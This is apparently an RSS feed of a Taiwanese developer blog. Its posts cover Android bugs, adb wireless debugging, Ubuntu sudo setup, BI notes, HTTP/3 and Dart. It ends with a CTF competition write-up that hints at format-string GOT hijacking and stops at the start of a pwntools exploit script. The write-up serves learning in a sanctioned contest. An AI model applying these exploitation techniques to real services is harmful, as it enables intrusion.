@@ -1,0 +1,2303 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on BlackMaple's Blog</title><link>https://blackmaple.me/posts/</link><description>Recent content in Posts on BlackMaple's Blog</description><generator>Hugo -- gohugo.io</generator><language>zh-TW</language><lastBuildDate>Tue, 13 Oct 2020 19:51:44 +0800</lastBuildDate><atom:link href="https://blackmaple.me/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>[Android] PopupWindow 設置 gravity 無效的問題</title><link>https://blackmaple.me/android-popupwindow-gravity-issue/</link><pubDate>Tue, 13 Oct 2020 19:51:44 +0800</pubDate><guid>https://blackmaple.me/android-popupwindow-gravity-issue/</guid><description>前言 今天在寫公司專案的時候遇到部分 Android 7 的手機，PopupWindow 不會理會設置好的 gravity，會直接跑到頂部。
+原因 在 Android Code Search 追了一下原始碼，發現 Android 7 在執行 PopupWindow.update() 的時候，會將 gravity 重設，因此造成 gravity 被重置為 Gravity.START | Gravity.TOP。
+有興趣的話可以自己看一下 Google 後來修復的 commit
+解法 剛好出問題的那段程式看起來沒有必要使用 update()，因此拿掉後問題就修復了。當然如果你一定需要使用 update() 的話，可以參考這篇 SlackOverflow，裡面有各種大神給的解法，這邊就不贅述囉！</description><content type="html"><![CDATA[<h2 id="前言">前言</h2>
+<p>今天在寫公司專案的時候遇到部分 Android 7 的手機，PopupWindow 不會理會設置好的 gravity，會直接跑到頂部。</p>
+<h2 id="原因">原因</h2>
+<p>在 <a href="http://cs.android.com">Android Code Search</a> 追了一下原始碼，發現 Android 7 在執行 PopupWindow.update() 的時候，會將 gravity 重設，因此造成 gravity 被重置為 <code>Gravity.START | Gravity.TOP</code>。</p>
+<p>有興趣的話可以自己看一下 Google 後來修復的 <a href="https://cs.android.com/android/_/android/platform/frameworks/base/+/9c0d523bc0b1ac3ebba92acb7e5d9675aff08aef:core/java/android/widget/PopupWindow.java;l=1592;drc=085160612d9066e23c96a6cac15eb3a51481fdaf;bpv=1;bpt=0;dlc=798fb798660115845ba42df293baa28b3cc26a03">commit</a></p>
+<h2 id="解法">解法</h2>
+<p>剛好出問題的那段程式看起來沒有必要使用 <code>update()</code>，因此拿掉後問題就修復了。當然如果你一定需要使用 <code>update()</code> 的話，可以參考這篇 <a href="https://stackoverflow.com/questions/41973893/android-nougat-7-1-1-showatlocation-gravity-not-working">SlackOverflow</a>，裡面有各種大神給的解法，這邊就不贅述囉！</p>
+]]></content></item><item><title>Android 11 新增無線偵錯 (Wireless Debugging)</title><link>https://blackmaple.me/android-11-wireless-debug/</link><pubDate>Sat, 10 Oct 2020 03:57:04 +0800</pubDate><guid>https://blackmaple.me/android-11-wireless-debug/</guid><description>&lt;p>不久前 Android 11 正式發布，可以看到有許多很酷炫的新功能，其中對身為 Android 開發者的我來說最興奮的應該就是「無線偵錯」了，這樣出門就可以更方便的開發了，因此趁著這段空閑就來試試看！&lt;/p></description><content type="html"><![CDATA[<p>不久前 Android 11 正式發布，可以看到有許多很酷炫的新功能，其中對身為 Android 開發者的我來說最興奮的應該就是「無線偵錯」了，這樣出門就可以更方便的開發了，因此趁著這段空閑就來試試看！</p>
+<h2 id="一過去">一、過去</h2>
+<p>在 Android 11 以前，要安裝 App 到手機上只有兩種方式：</p>
+<ol>
+<li><strong>USB 傳輸線</strong></li>
+<li><strong>ADB Over Wireless：</strong> 這方法使用的是 ADB 的 <code>tcpip</code> 和 <code>connect</code> 指令來連接兩個裝置，但在第一次連接的時候，還是得插上傳輸線，且當中斷後要重新連上時，也還是得再次插上傳輸線。</li>
+</ol>
+<p>這些方法都有一些局限性，因此之前一直在期待說未來會不會有更方便的方式呢？</p>
+<h2 id="二現在---android-11">二、現在 - Android 11</h2>
+<p>無線偵錯（Wireless Debugging）是 Android 11 的新功能，可以透過 WiFi 來連結兩裝置，這也是仰賴了新的 ADB 指令 - <code>pair</code> 才得以達成。它相較過往的方式有幾項優點：</p>
+<ul>
+<li>不需要 USB 傳輸線</li>
+<li>不需要額外安裝任何東西</li>
+<li>只要開啟「無線偵錯」就可以自動重新連接</li>
+</ul>
+<h2 id="三無線偵錯-wireless-debugging">三、無線偵錯 Wireless Debugging</h2>
+<h3 id="前提條件">前提條件</h3>
+<ul>
+<li>手機版本 ≥ Android 11</li>
+<li>SDK platform-tools 版本 ≥ 30.0.0</li>
+<li>手機與電腦連上同一個 WiFi</li>
+</ul>
+<h3 id="步驟----android-11-手機">步驟 -  Android 11 手機</h3>
+<ol>
+<li>
+<p>點擊 設定 → 開發人員選項 → 允許「無線偵錯」</p>
+</li>
+<li>
+<p>點擊 無線偵錯 → 使用配對碼配對裝置</p>
+<p><img src="https://i.imgur.com/Fcq0AaP.jpg" alt=""></p>
+</li>
+<li>
+<p>紀錄「Wi-Fi 配對碼」及「IP 位址和通訊埠」，後面會用到</p>
+<p><img src="https://i.imgur.com/YWVcNsE.jpg" alt=""></p>
+</li>
+</ol>
+<h3 id="步驟---電腦">步驟 - 電腦</h3>
+<ol>
+<li>
+<p>安裝 ADB</p>
+<ul>
+<li>已安裝 Android Studio → 可以在 Android SDK 底下的 platform-tools 資料夾中找到 <code>adb</code></li>
+<li>未安裝 Android Studio → 可以在 Google 上找到很多方法，這邊就不贅述了</li>
+</ul>
+</li>
+<li>
+<p>在 terminal 中執行 <code>adb pair ipaddr:port</code></p>
+<ul>
+<li><code>ipaddr</code>：填入上面步驟 3 取得的 IP</li>
+<li><code>port</code>：填入上面步驟 3 取得的 port</li>
+</ul>
+</li>
+<li>
+<p>輸入「Wi-Fi 配對碼」。成功後會顯示訊息配對成功的訊息。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Enter pairing code: <span style="color:#ae81ff">482924</span>
+Successfully paired to 192.168.0.106:37117 <span style="color:#f92672">[</span>guid<span style="color:#f92672">=</span>adb-08141JEC216786-neR228<span style="color:#f92672">]</span>
+</code></pre></div></li>
+<li>
+<p>若 Android Studio 上還是找不到該裝置，則需要手動執行 <code>adb connect ipaddr:port</code> 來連接。<strong>IP 和 port 請使用下方這組，千萬不要用到上面那組喔！！</strong></p>
+<p><img src="https://i.imgur.com/nKO9e2U.jpg" alt=""></p>
+</li>
+</ol>]]></content></item><item><title>如何在 Ubuntu 20.04 創建 Sudo user？</title><link>https://blackmaple.me/%E5%A6%82%E4%BD%95%E5%9C%A8-ubuntu-20-04-%E5%89%B5%E5%BB%BA-sudo-user/</link><pubDate>Thu, 07 May 2020 17:33:02 +0000</pubDate><guid>https://blackmaple.me/%E5%A6%82%E4%BD%95%E5%9C%A8-ubuntu-20-04-%E5%89%B5%E5%BB%BA-sudo-user/</guid><description>&lt;p>創建 server 後，我們通常都會先在其中創建我們自己的 user 方便操作，同時也會需要有 root 權限才能操作更多指令。&lt;/p>
+&lt;blockquote>
+&lt;p>每個 Linux 發行版對於創建 sudo 使用者的操作都是大同小異，但可能會有一些差別，因此這邊紀錄了 Ubuntu 20.04 的 sudo 使用者創建方式。&lt;/p>
+&lt;/blockquote>
+&lt;ol>
+&lt;li>
+&lt;p>以 root 身份登錄到你的伺服器。&lt;/p>
+&lt;blockquote>
+&lt;p>將下面 server_ip_address 替換為你伺服器的 ip&lt;/p>
+&lt;/blockquote>
+&lt;pre>&lt;code class="language-shell=" data-lang="shell=">ssh root@server_ip_address
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;/ol></description><content type="html"><![CDATA[<p>創建 server 後，我們通常都會先在其中創建我們自己的 user 方便操作，同時也會需要有 root 權限才能操作更多指令。</p>
+<blockquote>
+<p>每個 Linux 發行版對於創建 sudo 使用者的操作都是大同小異，但可能會有一些差別，因此這邊紀錄了 Ubuntu 20.04 的 sudo 使用者創建方式。</p>
+</blockquote>
+<ol>
+<li>
+<p>以 root 身份登錄到你的伺服器。</p>
+<blockquote>
+<p>將下面 server_ip_address 替換為你伺服器的 ip</p>
+</blockquote>
+<pre><code class="language-shell=" data-lang="shell=">ssh root@server_ip_address
+</code></pre></li>
+</ol>
+<ol start="2">
+<li>
+<p>使用 <code>adduser</code> 指令將新用戶添加到你的系統</p>
+<blockquote>
+<p>將下面 username 替換為你要創建的用戶</p>
+</blockquote>
+<pre><code class="language-shell=" data-lang="shell=">adduser your_username
+</code></pre></li>
+<li>
+<p>設置 user 的密碼和資訊</p>
+<blockquote>
+<p>第 3 點的資料可以隨便填或留空</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/07/WGrwZdnsYP7LpIV.png" alt="截圖 2020-05-07 下午5.37.08拷貝"></p>
+</li>
+<li>
+<p>使用 usermod 指令將用戶添加到 wheel 中。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">usermod -aG sudo your_username
+</code></pre></div><p>默認情況下，在 Ubuntu 上，sudo 群組裡的成員具有 sudo 權限。</p>
+</li>
+<li>
+<p>在 user 上測試 sudo 訪問權限</p>
+<ul>
+<li>
+<p>使用該 su 命令切換到新的 user 。</p>
+<pre><code class="language-shell=" data-lang="shell=">su - your_username
+</code></pre></li>
+<li>
+<p>測試是否擁有 root 權限</p>
+<pre><code class="language-shell=" data-lang="shell=">sudo ls -la /
+</code></pre></li>
+<li>
+<p>第一次使用 sudo 時，系統會提示你輸入 user 的密碼。輸入密碼以繼續，如果您前面操作正確，則會以 root 權限來執行。</p>
+<pre><code class="language-shell=" data-lang="shell=">Output:
+[sudo] password for username:
+</code></pre></li>
+</ul>
+</li>
+</ol>]]></content></item><item><title>商業智慧筆記（一）- 大數據時代的商業智慧簡介</title><link>https://blackmaple.me/%E5%95%86%E6%A5%AD%E6%99%BA%E6%85%A7%E7%AD%86%E8%A8%98%E4%B8%80-%E5%A4%A7%E6%95%B8%E6%93%9A%E6%99%82%E4%BB%A3%E7%9A%84%E5%95%86%E6%A5%AD%E6%99%BA%E6%85%A7%E7%B0%A1%E4%BB%8B/</link><pubDate>Sun, 03 May 2020 13:33:05 +0000</pubDate><guid>https://blackmaple.me/%E5%95%86%E6%A5%AD%E6%99%BA%E6%85%A7%E7%AD%86%E8%A8%98%E4%B8%80-%E5%A4%A7%E6%95%B8%E6%93%9A%E6%99%82%E4%BB%A3%E7%9A%84%E5%95%86%E6%A5%AD%E6%99%BA%E6%85%A7%E7%B0%A1%E4%BB%8B/</guid><description>&lt;h2 id="商業智慧的含義">商業智慧的含義&lt;/h2>
+&lt;h3 id="什麼是商業智慧">什麼是商業智慧？&lt;/h3>
+&lt;p>資料倉儲學院（TDWI）將商業智慧比喻成 &lt;strong>資料煉油廠&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>煉油廠流程：原料 → 原油 → 各式商品&lt;/li>
+&lt;li>商業智慧流程：原料 → 原始資料 → 各式資訊產品&lt;/li>
+&lt;/ul>
+&lt;p>商業智慧即是一個資訊處理的程序，經過一連串資料萃取、轉換，並載入資料倉儲後，允許使用者透過各種資料查詢和分析方法。目的在於匯聚過往經驗，已產生管理目前並規劃未來企業運作的經營智慧。&lt;/p></description><content type="html"><![CDATA[<h2 id="商業智慧的含義">商業智慧的含義</h2>
+<h3 id="什麼是商業智慧">什麼是商業智慧？</h3>
+<p>資料倉儲學院（TDWI）將商業智慧比喻成 <strong>資料煉油廠</strong>：</p>
+<ul>
+<li>煉油廠流程：原料 → 原油 → 各式商品</li>
+<li>商業智慧流程：原料 → 原始資料 → 各式資訊產品</li>
+</ul>
+<p>商業智慧即是一個資訊處理的程序，經過一連串資料萃取、轉換，並載入資料倉儲後，允許使用者透過各種資料查詢和分析方法。目的在於匯聚過往經驗，已產生管理目前並規劃未來企業運作的經營智慧。</p>
+<p>商業智慧可以大略分成以下流程：</p>
+<ul>
+<li>從 <strong>原始資料</strong> 到 <strong>資料倉儲的資訊</strong>
+<ol>
+<li>從企業交易和內營運系統中萃取出資料</li>
+<li>再經過處理及轉換</li>
+<li>將定義清楚且一致的資料彙總</li>
+<li>載入資料倉儲</li>
+</ol>
+</li>
+<li>從 <strong>資訊</strong> 到 <strong>知識</strong>
+<ul>
+<li>利用各種報表和分析工具，分析資料倉儲中的資訊</li>
+<li>可以找出資料中的趨勢、型態、例外狀況，協助使用者將資訊轉成知識</li>
+</ul>
+</li>
+<li>從 <strong>知識</strong> 到 <strong>決策</strong>
+<ul>
+<li>從分析中所發現的趨勢和型態中可以建立業務規則，也可作為建立決策模型的依據</li>
+</ul>
+</li>
+<li>從 <strong>決策</strong> 到 <strong>行動</strong>
+<ul>
+<li>根據決策產生執行計畫，將決策方案轉成實際行動</li>
+</ul>
+</li>
+<li><strong>回饋迴圈</strong> — 一但計劃開始實施，整個循環便會重複
+<ul>
+<li>根據顧客的後續反應，可以萃取出新的資料</li>
+<li>將新萃取的資料輸出到新的商業智慧流程中</li>
+<li>如此循環即可不斷的修正決策，以達到最佳效果</li>
+</ul>
+</li>
+</ul>
+<p>商業智慧有以下基本概念需要注意：</p>
+<ul>
+<li>整個流程是環環相扣的，若有疏忽則會影響後續流程</li>
+<li>商業智慧的成效有賴於資料和資訊的品質，若垃圾進則會垃圾出</li>
+<li>須整合業務和資訊技術的專業</li>
+<li>目的在於支援決策
+<ul>
+<li>結構化決策：可透過商業智慧工具達到近乎自動化</li>
+<li>半結構化決策：可提供決策參考</li>
+</ul>
+</li>
+<li>關鍵績效指標（KPI）必須定義清楚、客觀衡量，並定期檢討修正</li>
+</ul>
+<blockquote>
+<p>BI 在本質上是一套程序、方法和資訊技術的整合運用</p>
+</blockquote>
+<h2 id="關鍵績效指標kpi">關鍵績效指標（KPI）</h2>
+<p>績效評量的三種類型：</p>
+<ul>
+<li>關鍵結果指標（KRI）
+<ul>
+<li>衡量這家公司某方面的表現</li>
+<li>常被誤認為 KPI</li>
+<li>格式工具：數位儀表板</li>
+<li>指標屬性：落後指標</li>
+<li>檢視週期：每個月、每季或每年</li>
+</ul>
+</li>
+<li>績效指標（PI）
+<ul>
+<li>指出該做的是什麼</li>
+</ul>
+</li>
+<li>關鍵績效指標（KPI）
+<ul>
+<li>告訴公司該做什麼可以改善公司績效</li>
+<li>格式工具：平衡計分卡</li>
+<li>指標屬性：領先指標 \ 目前或未來導向</li>
+<li>檢視週期：全時監控或每天或每週</li>
+</ul>
+</li>
+</ul>
+<h2 id="平衡計分卡bsc">平衡計分卡（BSC）</h2>
+<p>平衡計分卡是一種策略管理方法，透過績效管理從四個構面將組織願景和策略化為具體的實施方案。</p>
+<p>四大構面：</p>
+<ul>
+<li>財務</li>
+<li>顧客</li>
+<li>內部流程</li>
+<li>學習與成長</li>
+</ul>
+<p>平衡計分卡主張由以上四個構面來定義其策略目標，有助於兼顧影響公司長期發展的所有構面。</p>]]></content></item><item><title>HTTP/3 改用 UDP？ HTTP 的過去、現在和未來</title><link>https://blackmaple.me/http-3-%E6%94%B9%E6%88%90%E5%9F%BA%E6%96%BC-udphttp-%E7%9A%84%E9%81%8E%E5%8E%BB%E7%8F%BE%E5%9C%A8%E5%92%8C%E6%9C%AA%E4%BE%86/</link><pubDate>Mon, 27 Apr 2020 11:49:49 +0000</pubDate><guid>https://blackmaple.me/http-3-%E6%94%B9%E6%88%90%E5%9F%BA%E6%96%BC-udphttp-%E7%9A%84%E9%81%8E%E5%8E%BB%E7%8F%BE%E5%9C%A8%E5%92%8C%E6%9C%AA%E4%BE%86/</guid><description>&lt;h2 id="一前言">一、前言&lt;/h2>
+&lt;p>聽到 HTTP/3 竟然要放棄 TCP 改用 UDP，相信不少人應該都感到很驚訝。在過往教課書及老師都告訴我們「UDP 不可靠，所以 HTTP 使用比較可靠的 TCP」，從來沒有想過這知識有一天竟然會被推翻，因此在震驚之餘，也來研究了一下 HTTP/3 內容及 HTTP 的過去、現在和未來。&lt;/p></description><content type="html"><![CDATA[<h2 id="一前言">一、前言</h2>
+<p>聽到 HTTP/3 竟然要放棄 TCP 改用 UDP，相信不少人應該都感到很驚訝。在過往教課書及老師都告訴我們「UDP 不可靠，所以 HTTP 使用比較可靠的 TCP」，從來沒有想過這知識有一天竟然會被推翻，因此在震驚之餘，也來研究了一下 HTTP/3 內容及 HTTP 的過去、現在和未來。</p>
+<p>2018 年 11 月，官方 (IETF) 批准，認可 HTTP-over-QUIC 實驗性協議重新命名為 HTTP/3，並成為 HTTP 的第三個正式版本。</p>
+<p>2019 年， Cloudflare、Chrome、Firefox 陸陸續續的支援了 HTTP/3，並共同合作來推行這項協定。</p>
+<p>目前逐漸成為主流的 HTTP/2 ，其相比 HTTP/1 大幅提升了性能，使網站只需要升級到新版協議即可享受性能所帶來的提升。當然其中也有許多問題，其中兼容性的問題也使得 HTTP/2 難以快速普及。</p>
+<p>既然 HTTP/2 有許多不完美之處，因此新的 HTTP/3 被推出來，為了解決 HTTP/2 所存在的問題。</p>
+<p>接下來我會從基礎的 HTTP/1 講起，省略掉一些複雜的細節，簡單的帶大家了解 HTTP 的過去、現在和未來。</p>
+<h2 id="二發展歷史">二、發展歷史</h2>
+<p><a href="https://zh.wikipedia.org/zh-tw/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">HTTP</a> 是 HyperText Transfer Protocol（超文本傳輸協定）的縮寫，是目前網際網路上應用最廣泛的網路協定。</p>
+<p>從 1996 年發布的 HTTP/1.0 到後來的 HTTP/2.0，它們都建立在 TCP 上，屬於電腦網路中的應用層，因此 HTTP 的瓶頸及優化方式都是基於 TCP 本身的特性。</p>
+<h3 id="1-http1">1. HTTP/1</h3>
+<p>HTTP/1.0 是第一個在通訊中指定版本號的 HTTP 版本，至今仍被廣泛採用，特別是在<a href="https://zh.wikipedia.org/wiki/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8">代理伺服器</a>中。</p>
+<p>不過隨著 HTTP/1.0 的快速成長，許多缺點也隨之暴露出來。在 HTTP/1.0 中，客戶端和伺服器之間交換的每個請求/回應都會建立一個新的 TCP 連接，這也意味著所有 TCP/TLS 握手均要在每個請求之前完成，因此所有請求都會產生延遲。</p>
+<p>更糟糕的是，TCP 不是在建立連接後儘快發送所有未完成的資料，而需要“慢啟動”的預熱時間，這使 “TCP 擁塞控制”能夠隨時確定可以傳輸的資料量，防止網路路徑發生擁塞，並避免將無法處理的封包都堆到網路中。但是，由於新連接必須經過緩慢的啟動過程，因此它們無法立即使用所有可用的網路帶寬。</p>
+<p>因此 HTTP/1.1 根據 HTTP/1.0 的一些問題做了優化。最重要改變是<strong>持久連接</strong>被預設採用以及<a href="https://zh.wikipedia.org/wiki/HTTP%E7%AE%A1%E7%BA%BF%E5%8C%96"><strong>HTTP 管線化</strong></a>。<strong>持久連接</strong>使客戶端能重複使用同一個 TCP 連接，從而分攤建立多個請求所花費的時間成本；<strong>HTTP 管線化</strong>使 HTTP 能同時傳送多個請求，以降負載，提高傳輸速度。但其因為必須按照客戶端傳送的請求順序來回覆請求，因此同時還是只能處理一個請求/回應。</p>
+<p>除此之外 HTTP/1.1 也做了一些改進如下：</p>
+<ul>
+<li>快取處理</li>
+<li>頻寬最佳化及網路連接的使用</li>
+<li>錯誤通知的管理</li>
+<li>訊息在網路中的傳送</li>
+<li>網際網路位址的維護</li>
+<li>安全性及完整性</li>
+</ul>
+<h3 id="2-spdy--http2">2. SPDY &amp; HTTP/2</h3>
+<p>隨著網際網路發展日趨蓬勃，網站所需資源及規模不斷增長，HTTP/1 已無法滿足需求，因此 SPDY &amp; HTTP/2 也隨之而來。</p>
+<h4 id="spdy-協定">SPDY 協定</h4>
+<p>2009 年，Google 為了解決 HTTP/1.1 效率不高的問題，設計了 SPDY 協定。SPDY 協定通過 header 壓縮、<a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8">多路復用</a>和優先級等來縮短載入時間。</p>
+<h4 id="http2">HTTP/2</h4>
+<p>2015 年，繼承 SPDY 的 HTTP/2 協定發布。HTTP/2 基於 SPDY，專注於性能，最大的一個目標是在用戶和網站間只用一個連接。</p>
+<p>HTTP/2 特性：</p>
+<ul>
+<li>二進位傳輸：HTTP/2 採用了二進位而非明文來打包。</li>
+<li>多路復用：很好地解決了瀏覽器限制同一個域名下的請求數量的問題，同時也更容易實現全速傳輸。</li>
+<li>Header 壓縮：引入 HPACK 演算法，用於對 HTTP 頭部做壓縮。</li>
+<li>伺服器推播：使伺服器可以預先將客戶端需要的內容傳送過去，而不需要等待頁面的解析。</li>
+</ul>
+<h3 id="3-http3">3. HTTP/3</h3>
+<p>雖然 HTTP/2 解決了許多舊版本的問題，但因其基於 TCP 上，所以還是存在一個巨大的問題。</p>
+<p>在丟包的情況下，TCP 會整個重新傳送，間接造成後面的數據被阻塞，導致 HTTP/2 的表現不如 HTTP/1。這是 TCP 本身的問題，但因 TCP 是由作業系統實現的協定，想要修改是一件不可能完成的任務。</p>
+<p>基於這個原因，Google 設計了一個基於 UDP 的 QUIC 協定，並使用在 HTTP 上。最初其被命名為 HTTP-over-QUIC，後來經過官方批准後，改名為 HTTP/3。</p>
+<p>與 TCP 相比，UDP 提供了更大的靈活性，並且使 QUIC 實現完全存在於用戶空間，使其脫離作業系統的依賴，讓使用者只要更新到支援 QUIC 的瀏覽器版本，使用者即可享受到 HTTP/3 所帶來的提升。</p>
+<p>以往我們認為 UDP 雖然實現簡單且傳輸效率高，但它安全低且可能有調包的風險。不過所幸基於 UDP 所設計的 QUIC 解決了以上問題，讓我們享受 HTTP/2 所有優點的同時，也解決了隊頭阻塞的問題。</p>
+<p>QUIC 還結合了典型的 3 向交握和 TLS 1.3 的握手。結合這些步驟意味著加密和身份驗證能夠默認提供，並且還可以更快地建立連接。</p>
+<h2 id="三總結">三、總結</h2>
+<ul>
+<li>HTTP/1：有連接無法復用、隊頭阻塞、協定開銷大和安全因素等多種缺陷。</li>
+<li>HTTP/2：通過多路復用、二進制流與 Header 壓縮等技術，極大地提高了性能，但是還是存在一些問題。</li>
+<li>HTTP/3：拋棄 TCP，以全新的視角重新設計 HTTP。其底層支撐是 QUIC 協議，該協議基於 UDP，有 UDP 特有的優勢，同時它又取了 TCP 中的精華，實現了即快又可靠的協議。</li>
+</ul>
+<p>從 HTTP/1 到 HTTP/3 經過不斷的更新及優化，底層協定也從 TCP 改成 UDP，許多以往我們所認定的觀念也跟著被推翻，這其中有許多事情值得我們細細思考。</p>
+<h2 id="四參考資料">四、參考資料</h2>
+<ul>
+<li><a href="%5Bhttps://zh.wikipedia.org/zh-tw/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE#HTTP/0.9%5D(https://zh.wikipedia.org/zh-tw/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE#HTTP/0.9)">超文本傳輸協定 - 維基百科</a></li>
+<li><a href="%5Bhttps://zh.wikipedia.org/wiki/%E9%98%9F%E5%A4%B4%E9%98%BB%E5%A1%9E%5D(https://zh.wikipedia.org/wiki/%E9%98%9F%E5%A4%B4%E9%98%BB%E5%A1%9E)">隊頭阻塞 - 維基百科</a></li>
+<li><a href="%5Bhttps://zh.wikipedia.org/zh-tw/TCP%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%5D(https://zh.wikipedia.org/zh-tw/TCP%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6)">TCP 壅塞控制 - 維基百科</a></li>
+<li><a href="https://zh.wikipedia.org/zh-tw/SPDY">SPDY - 維基百科</a></li>
+<li><a href="https://zh.wikipedia.org/zh-tw/HTTP/3">HTTP/3 - 維基百科</a></li>
+<li><a href="https://www.infoq.cn/article/x80uOvcRyxVYw3KVusUm">HTTP/3 的过去、现在和未来</a></li>
+</ul>]]></content></item><item><title>Flutter: const vs final</title><link>https://blackmaple.me/flutter-const-vs-final/</link><pubDate>Thu, 23 Apr 2020 00:57:52 +0000</pubDate><guid>https://blackmaple.me/flutter-const-vs-final/</guid><description>Const 需要在創建時就給定值，且會在編譯時期決定好，因此如果是執行時期才知道的值是不能用 const 的。 const 裡的值也得要是 const，不能是在執行階段才知道或是可改變的值，因此下面的範例會失敗： const arr = [1, 2, 3] arr[1] = 11 // 執行失敗 Final 給定值之後就不能再更改，但可以在建構子之中再給。</description><content type="html"><![CDATA[<h2 id="const">Const</h2>
+<ul>
+<li>需要在創建時就給定值，且會在編譯時期決定好，因此如果是執行時期才知道的值是不能用 const 的。</li>
+<li>const 裡的值也得要是 const，不能是在執行階段才知道或是可改變的值，因此下面的範例會失敗：
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dart" data-lang="dart"><span style="color:#66d9ef">const</span> arr <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>]
+arr[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">11</span> <span style="color:#75715e">// 執行失敗
+</span></code></pre></div></li>
+</ul>
+<h2 id="final">Final</h2>
+<ul>
+<li>給定值之後就不能再更改，但可以在建構子之中再給。</li>
+</ul>
+]]></content></item><item><title>AIS3 Final CTF - hellOwOrld</title><link>https://blackmaple.me/ais3-final-ctf-helloworld/</link><pubDate>Wed, 31 Oct 2018 00:56:21 +0000</pubDate><guid>https://blackmaple.me/ais3-final-ctf-helloworld/</guid><description>&lt;p>我們這隊都是第一次參加 AIS3 Final CTF，結果拿到第 18 名的成績，滿開心的ＸＤ
+這邊整理了一些解題過程和思路，有興趣可以看一下～
+如果有任何其他思路也歡迎在下面提出！&lt;/p></description><content type="html"><![CDATA[<p>我們這隊都是第一次參加 AIS3 Final CTF，結果拿到第 18 名的成績，滿開心的ＸＤ
+這邊整理了一些解題過程和思路，有興趣可以看一下～
+如果有任何其他思路也歡迎在下面提出！</p>
+<p><img src="https://i.imgur.com/Q2Qi8Is.png" alt=""></p>
+<hr>
+<h2 id="misc">misc</h2>
+<h3 id="painting-bot100">Painting bot/100</h3>
+<blockquote>
+<p>This is an AI painting bot. Could you get the flag from the bot?
+(Please remember to back up important files in your system.)
+(Any loss caused by this program will not be covered by us.)</p>
+<p><a href="https://drive.google.com/open?id=1On546O2kvyqQBWuyNmKYrWIeoMqYf1vn">http://ctf.ais3.org/files/misc1_artist.exe</a></p>
+</blockquote>
+<p>這是我原本看到題目後做的事
+查看檔案有沒有藏東西
+<img src="https://i.imgur.com/7jnPoMd.png" alt=""></p>
+<p>發現有HTML，因此用 dd 拆出來，打開後發現沒屁用
+<img src="https://i.imgur.com/KLZ8v8m.png" alt=""></p>
+<blockquote>
+<p>沒頭緒</p>
+</blockquote>
+<blockquote>
+<p>其實也不需要頭緒，只要和小畫家一起打開就好，然後在他開始控制滑鼠前切到小畫家就好QwQ</p>
+</blockquote>
+<hr>
+<h3 id="rpg200">RPG/200</h3>
+<blockquote>
+<p>Here is a secret RPGMaker XP game. Win the game and you will get the flag!
+If you don&rsquo;t have rtp, please visit the site at
+<a href="https://sites.google.com/site/taiwanrpgplayer/rtp">https://sites.google.com/site/taiwanrpgplayer/rtp</a>
+and download RPG Maker XP RTP.</p>
+<p><a href="https://drive.google.com/open?id=1OsC-rKw_YzSNMbOXR0HH2U4PB_rOwgeX">http://ctf.ais3.org/files/misc2_rpg.exe</a></p>
+</blockquote>
+<pre><code>由於作者在開發時使用了有中文名稱的 bgm 檔案，如果跳出`沒有發現檔案 Audio/BGM/巨人`的錯誤訊息，~~恭喜你，作者排擠使用非 Big5 碼的族群~~，想辦法轉區吧 (´・ω・`)
+</code></pre>
+<p>首先，到網路上找到神奇的 rgss decrypter，把所有東西全部解出來</p>
+<p><img src="https://i.imgur.com/GKo6vmp.png" alt="rgss decrypter"></p>
+<p>接著到官網下載 RPG Maker XP 開發工具，它可以順便裝好 RTP
+開一個新 project 把所有東西丟進去 (或是在 rgss decrypter 點 <code>Generate Game.rxproj</code>)，
+在 end 的場景左上角會發現一個被框起來的格子 (event)
+打開之後就會發現這一行：</p>
+<p><img src="https://i.imgur.com/MMgm444.png" alt="Flaaaaaag!!"></p>
+<p>如果把它塞進初始化的 event 裡，遊戲一開始就會跳出 flag 給你看了 OωO</p>
+<hr>
+<h3 id="hat300">Hat/300</h3>
+<blockquote>
+<p>Every hacker has his/her own hat! Try to customize one for yourself!</p>
+<p><a href="https://drive.google.com/file/d/1P9dRCXg0Ecc9ndyaNIelYF_mwnbCzVyw">http://srv03.ctf.ais3.org:9001/</a></p>
+</blockquote>
+<p><img src="https://i.imgur.com/kUsr8WU.png" alt=""></p>
+<p>聽說找到 <code>.git</code> 的資料夾可以還原兩個檔案</p>
+<hr>
+<h2 id="pwn">pwn</h2>
+<h3 id="baby-format100">Baby format/100</h3>
+<blockquote>
+<p>Nothing in the world cannot be solved by a single printf. If there was, try to work with two printf&rsquo;s!
+hint: printf has buffer, and you will only see the output after the buffer is full.
+hint2: maybe try GOT Hijack and return to main</p>
+<p><a href="https://drive.google.com/file/d/1PDaW1fH8j7i0dFUWcFp1Ze2sz4_B6gAI">http://ctf.ais3.org/files/pwn1_fmt.7z</a></p>
+<p>service is on srv01.ctf.ais3.org:5521</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;srv01.ctf.ais3.org&#39;</span>
